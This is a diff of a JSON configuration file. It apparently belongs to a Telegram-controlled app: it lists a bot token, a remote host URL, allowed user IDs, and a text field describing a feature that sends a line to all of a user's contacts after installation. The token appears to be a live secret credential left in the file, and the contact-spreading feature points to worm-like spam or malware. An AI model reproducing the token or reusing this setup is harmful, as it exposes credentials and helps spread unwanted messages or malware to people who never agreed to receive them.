@@ -1,7 +1,10 @@
 {
-    "token": "8594074766:AAG-5MUhpQ4lRCDKa9QOAfmwgRRuILG1D_k",
-    "id": "5367548123",
-    "id": "7577196099",
-    "host": "https://red0-0p.onrender.com/",
-    "text": "dont write anything here it works only in premium version this feature send  this line on all contacts after installation"
+  "token": "8594074766:AAG-5MUhpQ4lRCDKa9QOAfmwgRRuILG1D_k",
+  "host": "https://red0-0p.onrender.com/",
+  "allowed_users": [
+    7577196099,
+    5367548123,
+    9876543210
+  ],
+  "text": "dont write anything here it works only in premium version this feature send  this line on all contacts after installation"
 }
